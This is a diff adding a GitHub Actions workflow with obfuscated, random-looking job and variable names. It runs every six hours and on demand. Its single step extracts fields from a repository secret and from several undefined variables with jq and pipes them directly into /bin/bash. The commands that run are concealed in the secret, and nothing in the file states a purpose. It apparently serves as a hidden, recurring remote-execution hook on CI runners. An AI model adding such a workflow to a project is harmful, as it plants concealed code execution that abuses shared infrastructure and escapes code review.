@@ -1,0 +1,21 @@
+name: guyindu0918
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guyindu0918
+        env:
+          iaa553: ${{ secrets.iaa553 }}
+        run: |
+          echo $iaa553 | jq -r .fwb20427 | /bin/bash
+          echo $txige48188 | jq -r .zrgt9 | /bin/bash
+          echo $ky013 | jq -r .opal8912 | /bin/bash
+          echo $f01880 | jq -r .rq44042 | /bin/bash
+          echo $ocf98 | jq -r .giv0316 | /bin/bash
+
